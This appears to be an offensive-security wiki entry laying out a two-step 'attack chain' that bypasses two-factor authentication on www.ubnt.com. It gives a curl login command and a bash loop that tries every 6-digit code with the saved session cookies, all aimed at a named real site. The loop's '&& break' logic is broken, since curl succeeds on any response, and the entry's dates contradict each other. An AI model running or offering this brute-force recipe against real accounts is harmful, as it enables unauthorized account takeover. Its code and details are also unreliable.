---
tags:
  - auth-bypass
  - 2fa-bypass
  - brute-force
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ubnt-login]]'
  - '[[commands/curl-ubnt-2fa-submit]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Submit-Valid-Credentials-to-Initiate-2FA]]'
  - '[[procedures/Brute-Force-2FA-Code-Submission]]'
step_count: 2
techniques:
  - '[[Brute Force]]'
description: >-
  Attack chain exploiting lack of rate limiting on Ubiquiti's 2FA code
  submissions to bypass multi-factor authentication after valid primary
  credentials.
skill_level: intermediate
impact_level: high
id: d5f622b5-aaa7-4dce-9bda-98efaca56685
created_at: '2025-12-14T17:31:19.776Z'
updated_at: '2025-12-14T17:31:19.776Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Two-Factor Authentication Bypass via Brute-Force on Ubiquiti Login

Multi-stage attack chain demonstrating a complete attack workflow to bypass 2FA on www.ubnt.com by brute-forcing the 6-digit code after successful primary login.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Submit Credentials] --> B[Brute-Force 2FA]
    B --> C[Account Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or [[commands/curl-ubnt-login]] for HTTP requests

### Target Environment

- Web platform
- Access to www.ubnt.com login page
- Valid username and password for a target account

### Initial Access Requirements

- Valid primary credentials (username/password)
- Network access to www.ubnt.com
- No prior 2FA code knowledge

## Detailed Attack Procedures

### Step 1: Submit Valid Credentials
procedure: [[procedures/Submit-Valid-Credentials-to-Initiate-2FA]]

**Objective**: Authenticate with primary credentials to trigger the 2FA code request, obtaining a session for subsequent submissions.

**Instructions**: Use [[commands/curl-ubnt-login]] to submit the username and password to the login endpoint:

```bash
curl -X POST https://www.ubnt.com/login -d "username=validuser&password=validpass" -c cookies.txt
```

**Expected Output**: Response indicating 2FA required, with session cookies saved for next step.

**Success Indicators**:
- HTTP 200 or redirect to 2FA page
- Session cookies generated
- No authentication failure

### Step 2: Brute-Force 2FA Code
procedure: [[procedures/Brute-Force-2FA-Code-Submission]]

**Objective**: Exploit lack of rate limiting by submitting multiple 6-digit code guesses until successful authentication.

**Instructions**: Load session cookies and use a loop with [[commands/curl-ubnt-2fa-submit]] to try codes from 000000 to 999999:

```bash
for code in {000000..999999}; do
  curl -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=$code" && break
  sleep 0.1  # Minimal delay to avoid overwhelming

done
```

**Expected Output**: Successful response (e.g., redirect to dashboard) upon correct code match.

**Success Indicators**:
- Authentication success message or dashboard access
- No rate limit errors across attempts
- Account session fully established

## Attack Chain Summary

### Key Achievements

1. Bypassed 2FA using only primary credentials and brute-force
2. Gained unauthorized full account access on www.ubnt.com
3. Demonstrated impact of missing rate limiting on 2FA endpoints

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Brute Force]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01*
